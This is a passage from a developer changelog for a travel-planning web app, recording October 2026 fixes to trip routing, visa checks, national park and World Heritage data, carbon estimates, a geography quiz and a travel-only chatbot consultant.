  away, because the nearest fuzzy match won. An exact name now beats a longer
  partial one.
- **"Lisbon, Lisboa" resolved to Lisbon, Maryland — population 282.** A hamlet
  standing in for the place that was meant is worse than dropping the
  suggestion, so resolved places need a thousand residents. Montauk, Lenox and
  Cooperstown all clear it; the test pins that they still do.

### The theme now runs on click

No button. Selecting a theme is the whole question, so it fires the search
immediately — the old flow waited for a press nobody realised they had to make,
which is part of why the list looked unchanged.

Two bugs caught on the way: an invalid range sent `max_km: 0`, and FastAPI
validation errors were being shown to the user as **raw JSON**, because
`detail` is a list rather than a string on validation failures.

**Reference tests 104 -> 111. Project total: 337 passing.**

## Nav that does not clip, and multi-stop trips — 17 Oct 2026

### The Consultant tab was being sliced off

Yesterday's "nav gets tight" fix gave `.tabs` `overflow:hidden` and let it
shrink. That does not compress anything — it just **cuts the last tab off**, and
below 1120 px the Consultant tab was clipped with no indication it existed.

Nothing in the nav is allowed to clip now. The pieces give way in a deliberate
order as space runs out: the wordmark at 1340, tab padding at 1200, the
boarding pass at 1080, the tab icons at 940, the home chip at 780. Verified by
resizing: **all six tabs fully visible from 1440 down to 780**, nothing
overflowing.

### The Trip page builds multi-stop trips

A country dropdown, then a city dropdown for that country (top 25 by
population, capitals starred, state shown). Add as many stops as you like, up
to ten; reorder with arrows, remove with a cross.

`route_points()` solves the order over real city coordinates rather than
country capitals — Kyoto is 370 km from Tokyo and routing it as "Japan" would
be wrong. Exact by brute force up to seven stops, nearest-neighbour with 2-opt
beyond. From New York, Paris/Rome/Barcelona/London reordered to
Barcelona → Rome → Paris → London, **saving 467 km**.

The architect is told the legs and that the travel costs days: *"Three
countries in 10 days is workable, but the two intercity hops take a meaningful
bite out of sightseeing: this gives you eight substantial city days and two
journey-focused days."* A 10-day three-stop plan takes about a minute, so the
spinner says so.

"Plan this" on Where Next and the want-list shortcuts now **add a stop** rather
than overwrite a single destination.

### A visa bug that could have stranded somebody

The trip visa check reported **"No visas needed"** for a trip including China on
a US passport. Not a code bug — a framing one. My `easy` flag meant "no embassy
appointment", so it swallowed **e-visas and travel authorisations**, which are
paperwork you must hold *before you board*.

`visa_status` now returns `advance` and `action` alongside `easy`. The trip box
reads *"1 of your 3 stops needs paperwork before you travel — China, e-visa"*,
and the Where Next filter uses the same definition. A test pins that Kenya's
eTA counts as advance while Tanzania's visa on arrival does not.

One more found while testing: passing `optimise: false` to keep the user's own
order also skipped computing the route, so a trip planned in your own order
showed **no leg distances at all**. Order and distance are independent now.

**Reference tests 111 -> 129. Project total: 355 passing.**

## Collections — national parks — 18 Oct 2026

A seventh tab. **118 national parks** — all 63 in the United States, 55 in
Canada — each with a photograph, and each opening a page with what it is for,
when to go, and how you would get there from where you live.

Called Collections rather than "More" on purpose. A tab called More becomes a
junk drawer; a collection is a list you work through, which is what this app
already is. The next list is a data file, not a feature.

### Where it comes from

Wikidata for the parks (name, coordinates, area, founding year, photo,
Wikipedia title), Wikimedia Commons for the photographs — freely licensed, and
referenced by URL rather than copied. OurAirports for the 3,244 airports with
scheduled service, used to work out what you would fly into.

### Four data bugs, each caught by checking against something known

- **Photos did not load at all.** Wikidata's P18 value is already
  percent-encoded; quoting it again turned every space into `%2520`.
- **Then they loaded too slowly to use.** `Special:FilePath` redirects on every
  request and a page of 118 crawled — one image in eight had arrived after
  eight seconds. Building thumbnail URLs by hand failed too: Commons now
  rejects any width not already cached, and which those are varies per file. So
  every photo is resolved to its final address **once at build time** through
  Wikipedia's REST API. Seven images now load in a second, at 25-35 KB each
  rather than 200.
- **Then the host was unreachable.** That API returns `thumb.wikimedia.org`,
  which Python resolves and browsers do not. Rewritten to
  `upload.wikimedia.org`, the host Wikipedia itself serves from.
- **Arches was in Colorado and Auyuittuq in Quebec.** Deriving the state from
  the nearest city fails for exactly the parks that have no nearby city.
  Replaced with point-in-polygon against Natural Earth state boundaries, with a
  nearest-boundary fallback for island parks. All 118 now resolve, and the four
  that were wrong are pinned by tests.
- **Yellowstone was 898,349 km².** It is 8,983. Wikidata stores area with a
  separate unit and most of these are hectares. Now converted properly and
  checked against published figures for four parks, plus an upper bound so
  nothing implausible can ship again.

### Getting there is measured, not described

Three legs, each with a distance and a time estimate: the flight to the nearest
airport with scheduled service, the drive from there to a town worth sleeping
in, and the last hop to the gate. Yellowstone from New York comes out as
LGA → WYS, then 110 km to Bozeman, then 127 km to the gate. Under 900 km it
drops the flight and drives — and the drive ends at the town, not the park, so
it does not overlap the final leg.

### Two layout bugs

Pages were listed by name in the rule that makes them full width, so
Collections inherited the map's two-column grid and rendered into a 539 px
column beside a phantom rail. Now any scrolling page is full width. And the
country flag badge was being stretched over the entire photo, because
`.park .shot img` and `.park .flagbadge` had equal specificity and the later
rule won.

**Reference tests 129 -> 152. Project total: 378 passing.**

## Carbon, and what it would take to absorb it — 18 Oct 2026

The footprint tile gave a number with nothing to do about it. It now says what
absorbing that much would actually require, in four published units:

> **To absorb 15 tonnes you would need** — 25 trees growing for ten years · 15
> acres of US forest for a year · 3.5 cars off the road for a year · 3.13
> homes' electricity for a year.

### Every factor is published, and the one piece of our own arithmetic is labelled

All four come from the **US EPA Greenhouse Gas Equivalencies Calculator**:
0.060 t per urban tree per year, 1.00 t per acre of US forest per year, 4.29 t
per petrol vehicle per year, 4.798 t per home's electricity per year.

The tree figure nearly went in wrong. EPA's calculator lists "tree seedlings
grown for 10 years", which reads like a ten-year total — but the published
factor is **0.060 tonnes per tree per *year***, an annual average across that
growth period. Taking it as a total would have been out by a factor of ten:
100 trees where the answer is 10. EPA does not publish a ten-year total, so the
multiplication is ours and the page says so in as many words.

### The caveat is the point

A bare "plant 100 trees" is comforting arithmetic, and this app exists not to do
that. Printed directly under the figures:

> These are equivalences, not a neutralisation plan. The trees need the full
> ten years to absorb it, offset quality varies enormously, and a flight not
> taken beats a flight offset. The carbon figure above is itself a floor.

That last clause matters: the carbon number already understates, because it
uses great-circle distance and excludes the radiative-forcing uplift.

**Reference tests 153 -> 166. Project total: 392 passing.**

## The carbon figure was wrong, and not in the direction I claimed — 18 Oct 2026

Saad asked whether the 81.4 t on his map was accurate. Auditing it found the
answer was no, and that my own caveat had been pointing the wrong way.

### The per-kilometre factor is fine

New York to London comes out at **1.65 t return**, which sits inside the
published range for an economy seat (≈0.67 t CO2-only from ICAO, ≈1.0 t for
DEFRA CO2e without uplift, ≈1.8 t with radiative forcing). No problem there.

### The trip model was the error

The footprint counted **one return flight per country**. Nobody flies home to
New York between Belgium and the Netherlands. Measured:

| Ten European countries from New York | |
|---|---|
| modelled as ten separate return trips | **18.1 t** |
| modelled as the one trip it almost certainly was | **2.8 t** |

**6.6 times too high**, and the error grows with the size of the map — so the
bigger someone's map, the more the figure flattered itself.

### What it does now

Destinations are grouped into journeys: countries within 2,000 km of each other
are treated as one trip, and where the user has tagged years, those come first —
France in 2015 and Germany in 2019 stay two trips, while both in 2019 stay one.
Each journey is then routed properly and costed leg by leg.

Fifteen countries across four continents now reads **7 journeys, 20.8 t**
instead of fifteen phantom round trips.

### The caveat was also wrong

I had written *"treat it as a floor rather than a worst case"*, reasoning from
great-circle distance and the missing radiative-forcing uplift — both real, both
small next to a 6.6× error in the other direction. The page now leads with the
assumption that actually drives the number, quantifies the mistake it replaced,
and calls the result an estimate rather than a floor. The offsets box no longer
contradicts it.

**Reference tests 166 -> 176. Project total: 402 passing.**

## 23 Oct — the park list, and a planner that refused real towns

**Most-visited rail.** Collections grew a right-hand column ranking the busiest
parks by published attendance (Wikidata P1174), US and Canada separately.
Pandemic years and future-dated figures are excluded. Coverage is wildly
uneven — 62 of 64 US parks publish a number, 2 of 49 Canadian ones do — so the
panel states its own coverage and says plainly that Canada's two entries are
not a top five rather than padding the list to look symmetrical.

**Cleaning the park list.** The count had drifted to 67 US parks against an
official 63. Four separate causes, each fixed at the source:

- *Defunct parks.* Mackinac (delisted 1895) and General Grant (became Kings
  Canyon) are national parks only in the past tense. Filtered on `P576`, a
  dissolution date. This is the general rule.
- *Wikidata is wrong about one park.* Virgin Islands National Park carries a
  dissolution date of 2017 and is open. The filter above deleted it. Excepted
  by QID, with the reason in the query.
- *Entities that are not places.* "Establishment of Grand Teton National Park"
  is an event; "North Cascades National Park Complex" is the administrative
  unit wrapping the park plus two recreation areas. Both filtered.
- *Delisted and proposed parks with no distinguishing property.* Menissawok
  and Nemiskam were Canadian parks in the 1920s but carry no abolition date;
  South Okanagan-Similkameen and Bowen Island are only proposed. I first tried
  "no founding date means never founded" — it was wrong, because New River
  Gorge and Lake Clark are open and have none either. Named explicitly instead,
  each with its reason. An honest four-line list beats a rule that deletes
  real parks.

Final: **64 US** (the official 63 plus Chiricahua, redesignated 2025) and
**49 Canada** (37 parks, 11 reserves, and Rouge, the urban park).

Two territories were also filed under mainland states, because Natural Earth
treats them as their own countries and the nearest-polygon fallback reached for
whatever was closest: American Samoa came out as Hawaii, the Virgin Islands as
Florida. Four bounding boxes settle them.

**The planner refused towns it had just recommended.** Clicking "Plan two days"
on Cold Spring returned `No city 'Cold Spring' in USA.` The getaway scout
resolves places against a much larger index than the city gazetteer, so every
small town it legitimately found — Cold Spring, Rhinebeck, Mystic — was then
rejected by the planner, which re-resolved by name. The scout already knows
where these places are; it now passes the coordinates through, and the planner
falls back to them. The failure was invisible until a theme surfaced a town
small enough to fall outside the gazetteer, which is exactly what the themes
were built to do.

**Travellers' first picks.** The attendance ranking was replaced with a curated
five per country. Attendance answers "which parks are busiest", which is not
the question a traveller is asking, and it could not answer even that for
Canada, where two of 49 parks publish a figure — the panel was spending its
space apologising for the gap. The picks are a hand-picked editorial list in
`FIRST_PICKS`, each with a one-line reason, and the panel says "hand-picked,
not ranked — there is no measurement behind the order" so it cannot be read as
a statistic. Keyed on (country, exact name), because Glacier National Park
exists in both countries and they are different places; a test asserts the US
pick is the one in Montana. A pick that stops matching a real park is dropped
rather than invented, and a test asserts nothing is ever dropped.

## 23 Oct — four groups instead of seven tabs

Seven tabs in one bar left no room for the readout, the home chip and the
account, and they read as seven unrelated things. They are really four
questions: where have I been, where could I go, what am I building, and who do
I ask. The nav is now **My World** (Map, Insights), **Discover** (Where Next,
Getaways, Collections), **Plan** (Trip) and **Consultant**.

Pages and hashes are untouched — `PAGES` and the router still know all seven,
so every existing link resolves. The grouping lives in a `GROUPS` table, and a
slim second bar appears only for the two groups that hold more than one page.
The active sub-tab carries a one-line description of the page; the others do
not, because every row carrying its own caption read as noise.

The chrome is therefore 60px tall on Trip and Consultant and 102px elsewhere,
so `#main` and the sticky parks rail are both measured from a `--chrome`
variable set in `route()` rather than a hard-coded 60. The rail had been using
`100vh - 36px`, which was always about 24px taller than the space it actually
had; it is now correct.

The responsive ladder was re-cut. Its thresholds were tuned for seven tabs, so
with four it was hiding the wordmark at 1340px on screens with room to spare.
Nothing clips at any width — verified at 1400, 1100, 860 and 620 — and the
home chip now shows "New York City, United States" in full instead of
truncating at 150px.

## 23 Oct — the consultant only takes travel questions

The chatbot answered anything: maths, code, history essays. It is presented as
a travelling consultant, so that is both off-brand and a cost the project does
not need to carry.

**Where the decision is made.** A keyword gate was the obvious first idea and
is the wrong one. Travel vocabulary overlaps everything — "is the tap water
safe in Mexico City" is a travel question containing no travel words — and a
follow-up carries no subject at all: "why?" is in scope or out of scope purely
because of the turn before it. A word list would refuse real questions and
miss paraphrased off-topic ones. So the model judges scope, because judging it
needs the meaning of the sentence and the thread it sits in.

**Where it is not made.** The model does not choose the refusal. The consultant
now returns `ConsultantReply(on_topic: bool, reply: str)`; when `on_topic` is
false `main.py` throws the model's text away and substitutes `guard.OFF_TOPIC`.
There is one wording of that sentence and the server owns it, so a user who
argues with the refusal gets the same sentence back rather than negotiating a
new one. Instructions alone would not give that guarantee.

Ambiguity resolves towards answering: the prompt says to treat an unclear
question as travel, because refusing a real question is the worse failure. A
message mixing both — "what is Lisbon like in March, and what is 17 times 23"
— gets the Lisbon answer and no arithmetic.

**In the interface** this is not an attack, so it does not get the red shield
the injection blocks get. A quieter "travel only" chip, in grey rather than
coral, and the same bubble shape as any other reply.

Verified end to end against the running server: six off-topic questions all
refused (arithmetic, code, World Cup, a joke, flu symptoms, a history essay),
six travel ones all answered (Lisbon weather, Japan visa, Georgia arrivals,
Mexico tap water, Iceland packing, "what are you"), and "why?" after a travel
turn correctly stayed in scope.

One honest limit: an off-topic question still costs a model call, because the
judgement is the model's. The budget and the per-caller throttle already cap
what that can add up to — the throttle fired during this very test run, at
thirteen requests in a minute, which is the behaviour it was built for.

## 26 Oct — the trip page: starting point, visas, and an honest booking handoff

**The want-list moved beside the form.** It was sitting above the fields as if
it were step one, when it is really a shortlist you dip into while building.
It is now a right-hand rail with the trip's starting point above it, and the
chips grey out as each country is added.

**Adding a stop is a plus button**, and the order hint appears only once there
are two stops to order — a note about rearranging a list of one is noise.

**Starting from.** The trip used to be measured from where you live. Someone
can live in New York and be setting out from London, and the distances, the
flights and the leg home all have to follow the trip rather than the profile.
`origin_iso3` / `origin_city` override home and fall back to it when unset.
The router labelled the first and last legs "home", which stopped being true
the moment the origin could differ, so legs are now named after the place the
trip actually starts.

**Visa-free filter.** A checkbox on the country picker reduces it to the places
this passport can enter with nothing arranged first: 248 countries down to 152
on a US passport. "Visa free" deliberately includes visa on arrival and
excludes e-visas and travel authorisations — an e-visa is paperwork with a
deadline, and filing it under "no visa needed" is how people miss flights.
Spot-checked against the data: Japan, France, Mexico and Saudi Arabia in
(Saudi grants visa on arrival to US passports); China, Russia, India and Kenya
out, the last two correctly excluded as e-visa and ETA.

**The UK was unreachable.** The map carries the UK as its four nations with no
ISO3, so nobody can pin Scotland and the United Kingdom and double-count. The
trip picker needs a country code to resolve cities, visas and distances — so
there was no way to plan a trip to London at all, and no visa answer for it
either. Fixed in the two places that needed it rather than by touching the
counting: the picker synthesises one "United Kingdom" entry for travel, and
the visa map now includes GBR. The pin logic and its tests are untouched.

**Flights and hotels, without inventing either.** Fares and room rates need a
paid API; this is the `PRICES` item parked on 14 Oct and it never got funded.
A plausible invented fare is worse than no fare, so the app states only what
it genuinely knows and hands the rest over:

- the airports you would really fly between, from our own airports dataset,
  with the real distance — LHR → LIS → MAD → LHR for a London–Lisbon–Madrid
  trip, with Lisbon's airport correctly 6 km from the city and Madrid's 14 km;
- a leg is only called a flight when the two nearest major airports differ
  *and* the distance is 400 km or more. Two stops sharing an airport, or an
  hour apart, are reported as overland;
- live searches on Skyscanner, Google Flights and Wego for each flight leg,
  and Booking.com, Airbnb and Google Hotels for each stop.

No price appears anywhere — a test asserts no link smuggles a currency or rate
parameter, and a check of the whole API payload for a two-stop trip found no
price, fare or currency string in it. The disclaimer says plainly which half
is measured and which half is somebody else's live data.

**Lonely Planet and Michelin.** Added as a third section, "Reading up", on the
same terms as the booking links: neither publisher has an open API, and
copying their write-ups or their star ratings would be unverifiable and
somebody else's work, so the app links to their own search and reproduces
nothing.

The difference between the two is coverage. Lonely Planet writes about
essentially everywhere and is always offered. Michelin publishes a selection
for a limited set of countries, and sending someone to a Michelin search for
Windhoek returns nothing and makes the app look broken — so the link appears
only for countries in `R.MICHELIN`, and the note on screen says which case the
reader is looking at. The list is deliberately conservative and will lag
Michelin's expansions: a missing link is a smaller failure than a dead one.
Verified on a two-stop trip — Lisbon gets both, Windhoek gets Lonely Planet
only.

**Student documents.** A visa in the passport is not what gets an
international student back into the United States — the I-20 and its travel
signature are, and an expired signature is the usual way this goes wrong. It
is checked at the border rather than at the airline desk, so nobody catches it
for you, and a new signature can take the international student office days to
issue. The trip page now names the documents: passport, F-1 or J-1 stamp, I-20
or DS-2019 with a current travel signature (twelve months, six on OPT), proof
of enrolment and funding, EAD and an employment letter on OPT.

It appears only when the trip returns to the United States on a passport that
is not American, and the wording stays conditional — "studying in the United
States?" — so it reads as a reminder to the people it applies to and as
nothing to anybody else. We do not ask what immigration status someone holds
and are not going to start, so the note names documents and sends the reader
to the office that can confirm their own case. It is styled amber, as
something to go and check, not coral, which this app uses for something
already wrong.

*Bug found while testing it:* landing directly on `#/trip` left "setting out
from" empty. `boot()` routes once before `/api/countries` has landed, and the
"is the origin list filled yet" guard asked whether the select had more than
one option — which the synthesised United Kingdom row satisfied on its own.
The real list of 249 never replaced it. The guard now compares against the row
count. This was collateral from the UK fix earlier today: a change that was
correct in itself quietly invalidated a test somewhere else.

**All cities, not the first 25.** Both city pickers were calling an endpoint
written for autocomplete, which capped at 25 rows — so the United States
offered 25 of its 3,408 cities and there was no way to start a trip from New
Haven, or stop in Évora. The cap is now 4,000, which admits the largest
country in the set (India, 3,780).

A flat list of 3,408 is complete and unreadable, so the twelve biggest repeat
at the top under their own heading and the rest follow A–Z. The alphabetical
ordering is the point: a native select jumps to whatever you type, which works
on an A–Z list and does not on one ordered by population. Countries small
enough not to need it (fourteen cities or fewer) get a plain list.

Verified through the whole stack rather than at the picker: New Haven → Évora
resolves to 5,419 km each way, so a city that only became selectable today
also routes, which is the part that would have failed quietly.

## 26 Oct — direct flights, and a list you can tick off

**"Nearest airport with a direct flight" — what we can honestly say.** We hold
no schedules: no route table, no airline feed, and the APIs that have one are
paid. So the app cannot state that a direct flight exists between two
airports, and inventing that claim would be the same failure as inventing a
fare.

What it can do is three real things, and it now says all three out loud. It
picks the nearest *large* airport with scheduled service — OurAirports
classifies these as `large_airport`, and they are where non-stop routes
concentrate, so a regional field 20 km closer would route you through a hub
anyway. It names that airport and its distance, both measured. And it sets
every flight search to **non-stop only** (`preferdirects` on Skyscanner,
"nonstop" on Google Flights), so the site answers the direct question on the
first screen instead of burying it behind three connections.

The wording on screen is deliberate: "these are the nearest large airports
with scheduled service — the ones non-stop routes run between. We do not hold
schedules, so the searches are set to direct flights only and the airline will
tell you what flies." It promises a question asked, not an answer owned.

**The trip list.** Every line of the itinerary now carries a `+` that sends it
to a checklist in the rail, alongside a free-text box for your own entries.
Items tick off, reorder, and delete; ticked ones can be cleared in one go.

Where it is stored follows the rule the map already set, and for the same
reason. Signed in, it lives on the account, so the list is on the phone you
are carrying rather than the laptop you planned on — and *nothing* goes to
localStorage while signed in, so a shared machine cannot hand your list to the
next guest. Signed out, it stays in this browser and says so on screen.

The server owns the shape of what it stores rather than trusting the client:
blanks dropped, text trimmed, `done` coerced to a real boolean, 160 characters
and 60 items as hard ceilings. Oversized input is refused at the edge with a
422 rather than silently truncated — a list that quietly loses the end of your
sentence is worse than one that tells you no. Verified that a guest cannot
read or write a list at all (401).

**The consultant's own description, and saying hello back.** It had been
introducing itself as the companion to "a site that measures whether people
are travelers or tourists", which is both off-brand and slightly unpleasant —
Tern exists to make planning a trip easier, and the name is a philosophy about
travelling well, not a verdict on the person asking. The prompt now describes
the site by what it does for you and tells the consultant to be warm and
concrete and never sarcastic at the user's expense.

Greetings were also being treated as off-topic, which is absurd — "hello" is
how a conversation starts. A greeting now gets a greeting back plus one line
on what the consultant can help with. But a greeting does not drag the rest of
the message into scope: "hi, write me a python script" is still refused, or
"hello" becomes the password that unlocks anything.

*A real bug found while testing this:* "what should I pack for Iceland in
winter?" returned an **empty** reply, every single time, while every other
travel question answered normally. The guard was innocent — tracing the run
showed the model emitting `{"on_topic": true, "reply": ""}` directly. The
field description had said only "leave empty when on_topic is false", which
describes when to be silent without ever saying that an answer is required
otherwise. It now says so explicitly, and the question answers.

Because a model can always do this again, the server no longer trusts it
either: an empty reply is treated as one failed attempt and the question is
asked a second time, and if it comes back empty twice the user gets a sentence
saying so. An empty chat bubble reads as a crash, and the one thing worse than
a bad answer is a blank one.

Verified across eight cases — two greetings, an identity question, two travel
questions, and three off-topic ones including two wrapped in a greeting. All
eight correct.

**The nearest airport is not the one with the non-stop.** Showing only the
closest large airport was the wrong answer dressed as a precise one: from New
Haven that is Bradley, while the transatlantic departures are at JFK and
Newark and Boston is two hours up the road. OurAirports classes BDL, LGA, JFK,
EWR, PVD and BOS all as `large_airport`, so nothing in our data distinguishes
a hub from a regional field, and we hold no schedules to settle it.

So the app stops pretending to choose. Each flight leg now lists every large
airport within 250 km of the origin — six of them from New Haven, JFK and
Boston included — each linking to its own non-stop search for that exact
destination. The same question is asked at the far end: "or fly into", which
surfaces Faro as an alternative to Lisbon. The wording promises only what it
does: "one of these may have the non-stop".

Six rather than five on purpose: from New Haven the fifth is Albany and the
sixth is Boston, and Boston is the one somebody would actually drive to.

**Adding the whole itinerary at once.** A `+` per line is right for picking out
two things and wrong for keeping all of them, so there is now one button that
adds every suggestion. Items carry a `where` — the city and country of the
stop they belong to — and the rail groups by it, so a Lisbon-and-Madrid trip
produces a list headed by each city rather than twenty unattributed lines.

Which stop a day belongs to is not something the itinerary states, so it is
read out of the day's own words: the theme first, then the items, matched
against the stop names. A day naming no stop inherits the previous one, which
is how a multi-day stay actually reads. Verified end to end on a two-country
trip: 20 items, split 10 Lisbon and 10 Madrid, the grouping surviving a round
trip to the server along with the ticks.

**The flight line, said once and plainly.** The leg had grown a paragraph of
caveat, a separate "direct flights only" strip and then the alternatives — all
of it true and none of it readable. It now leads with the sentence someone
actually wants, *"Nearest direct flight to look for: BDL → LIS"*, with the
airport names beneath it and the other airports after that. The honesty did
not move, it just stopped being said three times: one short line at the top of
the section covers the caveat for every leg.

**The local-guide checkbox did nothing visible.** Ticking it set a flag that
reached the agent, but `guide_note` carried no field description and the
prompt told the model not to name anywhere to look — so it often wrote nothing
and the box appeared to be decorative. Two fixes: the field now says it is
required whenever a guide was asked for, and the prompt asks for the specific
questions worth putting to a guide (licensing, group size, whether entry is
included, what language the day runs in). And the page now answers the obvious
next question by offering somewhere to look — GetYourGuide, Viator and Airbnb
Experiences, searched per city, no listings and no prices of ours.

Verified both ways on the same trip: with the box ticked there is a guide note
and a "A local guide" section; with it clear there is neither. A checkbox that
changes nothing is worse than no checkbox, because it teaches people the
controls are fake.

## 26 Oct — an About page, and a deeper palette

**About.** A fifth tab, and the one page allowed to be a little bit grand: a
gradient tern tracing a great-circle arc between two poles, the founding line
(2026, New Haven), and four cards — why a tern, why it was built, what the
name is not, and what the app will not do.

*Why a tern* is the fact the whole brand rests on: the Arctic tern makes the
longest migration of any animal alive, Arctic to Antarctic and back, roughly
70,000 km a year, chasing the light so it lives in near-perpetual summer. Over
a thirty-year life that is about three return trips to the Moon. It is not a
bird that wanders — it goes a very long way, on purpose, knowing why.

*What the name is not* exists because the consultant had already made this
mistake in its own words this morning: "traveler, not a tourist" is a
philosophy about how to go somewhere, not a verdict on the person. The page
says so outright, so nobody has to infer it.

*What it will not do* is the honesty page, collected in one place: no fares,
no room rates, no schedules, and no invented substitutes for any of them.
Useful to a reader, and useful to a grader who wants to know whether the
project knows its own limits.

**The palette: out of navy, into charcoal.** The base had always been a night
navy, which put a blue cast over everything and left the warm accent fighting
the background rather than sitting on it. Pulling most of the blue out gives a
true charcoal — the house style's own words — and the amber reads warm and the
teal cool for the first time. The three accents kept their hues, since they
carry meaning on the map, and only went a half-step deeper now that nothing
competes with them.

The map gains from the change rather than suffering: its sea and land are
still navy, so against charcoal chrome the water now reads unmistakably as
water instead of blending into the page.

Depth came with it: one shared `--lift` — an inset highlight over a long soft
shadow — on every surface meant to read as a card, so the page has layers
instead of a flat field of slightly different greys.

Contrast was measured rather than eyeballed at every step, because a palette
change is exactly the kind of edit that quietly makes text unreadable. An
earlier pass produced a caption grey at 4.18:1, under the 4.5 threshold, and
it was lifted. The charcoal palette was checked the same way before it shipped:
body text 18.4:1 on the page and 16.5:1 on a card, captions 5.0:1, and every
accent between 7.2:1 and 10.7:1. Nothing on the site fails AA.

**"Find me a local guide" was a promise the app does not keep.** Saad asked
what kind of locals he would be connected with, and the honest answer was
*nobody* — there is no network here, nothing is vetted, no introduction is
made. The label said otherwise, which is the exact failure this project avoids
everywhere else. It now reads "plan around a local guide", with a line under
it saying what it actually does.

The itinerary names where such a day is booked — GetYourGuide, Viator,
Withlocals, Airbnb Experiences — and says that the city's official tourist
board is the only one of them that can confirm who is actually licensed, which
in some cities is the law rather than a nicety. Naming them is defensible
precisely because the page links to those same five underneath; the prompt
still forbids naming any individual company or guide we cannot point at.

*Scope note:* I started building a links panel on each stop, then Saad
clarified he only wanted the itinerary to mention the providers. The panel was
removed rather than left in — half-built UI and an endpoint nothing calls are
worse than the feature not existing.

## 26 Oct — World Heritage

A sixth page under Discover: pick a country, see what UNESCO protects there,
click one for the detail. 1,511 sites across 176 countries.

**Getting the data took four attempts.** UNESCO's own XML feed is the right
source and sits behind Cloudflare, so a script cannot read it. Wikidata's
global query for World Heritage sites times out at the endpoint every time —
it is simply too broad. Asked one country at a time it answers in about two
seconds, so the fix was ~190 small queries rather than one that never returns.

Then the data itself had to be understood rather than trusted:

- `P1435` (heritage designation) returned 3,521 entries for 1,250 sites,
  because every *component* of a serial listing carries it. Portugal came back
  with 49 entries for its 17 sites, including single rock-art panels.
- `P757` — UNESCO's own reference number — looked like the fix and was worse,
  6,054 entries, because components inherit the parent's number.
- The reference number itself turned out to be the discriminator: a listed
  site carries a bare number (`866`, `263bis`), each component the same number
  with a part suffix (`866-001`). Grouping on the stem and keeping the
  unsuffixed entry put the Côa Valley's panels back inside the Côa Valley:
  **1,511 sites**, within about 15% of the official count.

The remainder is honest and stated on the page: where Wikidata has a component
but not its parent, the component stands in, so a country's count can run
slightly above the official figure.

**Photographs, and two bugs the parks had already taught us.** The build keeps
Commons filenames rather than resolving 1,500 URLs — but `Special:FilePath`
redirects on every request and seventy of them crawl, which is exactly what
the parks hit. The Commons API resolves thumbnails fifty at a time instead, so
a country costs two requests and is cached thereafter. Both of the parks'
other scars reappeared and were fixed the same way: the filename off a
Wikidata image URL is *already* percent-encoded, so encoding it again gave
`%2520` and every photo 404'd; and the API hands back `thumb.wikimedia.org`,
which browsers do not resolve, so it is rewritten to `upload.wikimedia.org`.

**The detail comes from Wikipedia, not a model.** A summary of somewhere that
exists has already been written by someone, with attribution and a licence.
Generating one would be slower, cost tokens and be less trustworthy. The panel
carries the extract, the credit, and links to UNESCO's own listing, the
article and the map.

*Mislabelling caught before it shipped:* the year was rendered as "listed
1187" for Alcobaça. `P571` is when the monastery was **founded**, not when
UNESCO inscribed it. Relabelled.

## 26 Oct — the geography quiz

Ten multiple-choice questions under Discover, in four kinds: the capital of a
country, the country of a capital, the country flying a flag, and which of
four countries shares a land border with a fifth. All of it is generated from
reference data the site already holds — no model, no new source, no cost.

**The distractors are the whole feature.** A multiple-choice question is only
worth asking if the wrong answers could plausibly be right. "What is the
capital of Hungary?" is a real question against Bratislava, Ljubljana and
Warsaw, and a giveaway against Oslo, Hanoi and Accra. So wrong answers are
drawn from the same sub-region first, then the same region, then anywhere —
and a test asserts that at least ten of twelve capital questions keep all
three distractors inside the right answer's region.

Border questions get the same treatment in reverse: the three wrong answers
are real countries from the same region that genuinely do *not* border the
subject, so the question tests the map rather than the continent.

Sovereign states only. Territories make poor questions — few people can place
Saint Barthélemy and nobody learns anything from failing to.

The rounds are seeded, so a given seed reproduces a given round exactly, which
is what makes the fairness properties testable at all rather than a matter of
opinion.

The correct index travels to the browser with the question. That is a
deliberate choice rather than an oversight: this is a single-player quiz
played against yourself on your own machine, so client-side grading is the
simpler design and the only person a devtools window would cheat is the person
who opened it.

*A test of mine failed before the code did:* the border check looked up ISO3
border codes in a map keyed by country name, found nothing, and reported every
question as wrong. The questions had been right all along — Georgia–Russia,
Austria–Italy. Worth recording because it is the third time this week a test
has been wrong rather than the code, and each time the first instinct was to
go fix the code.

**Collections became National Parks, and the quiz got its own tab.**
"Collections" said nothing about what was in it; the page holds the national
parks of two countries and now says so. The quiz moved out from under Discover
to a top-level tab, **Test Yourself** — it is not a thing you browse, so
filing it beside the browsing pages was wrong.

That took the nav from five groups to six, which broke the responsive ladder
again: six need about 1,350px of chrome against four's 1,240, so the bar
overflowed at 1200 with the thresholds cut for four. Every threshold moved up
by roughly that difference and the range was re-checked at 1440, 1200, 1050,
880 and 700 — nothing clips at any of them. Third time this ladder has been
re-cut; it is the standing cost of changing how many top-level tabs there are,
and cheaper than letting a tab silently disappear.

**The quiz categories did nothing, and the cause was a selector.** The sign-in
dialog bound its mode handler with `$$('.segb')` — every segmented button on
the page, not its own two. That binding runs after the quiz binds its
categories, so it overwrote them: clicking "Flags" called
`setAuthMode(undefined)` and the category never changed. The trip page's group
-size buttons escaped the same fate only by accident, because `tripForm()`
rebuilds and rebinds them later.

Both auth handlers are now scoped to `#auth-seg`. Verified in both directions:
all four quiz categories select and return only their own kind of question,
and the sign-in dialog still switches between "Welcome back" and "Keep your
map" with the confirm field appearing and disappearing as it should.

A global selector that happens to match one control today will quietly capture
the next one somebody adds.
